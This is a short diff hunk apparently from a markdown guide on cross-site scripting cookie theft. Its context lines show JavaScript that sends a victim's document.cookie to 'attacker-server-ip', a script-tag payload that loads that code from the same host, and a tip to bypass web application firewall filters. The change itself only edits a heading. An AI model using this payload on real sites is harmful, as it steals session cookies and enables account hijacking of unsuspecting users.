@@ -5,8 +5,7 @@
 request.open('GET', 'http://attacker-server-ip/?test='+document.cookie, true);
 request.send() ``` <br/>
 
-<br/>
-### 2. Submit a payload which will render the above script
+# 2. Submit a payload which will render the above script
 ``` <script src="http://attacker-server-ip/cookie.js"></script> ```
 Try to bypass the filters if there is any WAF
 
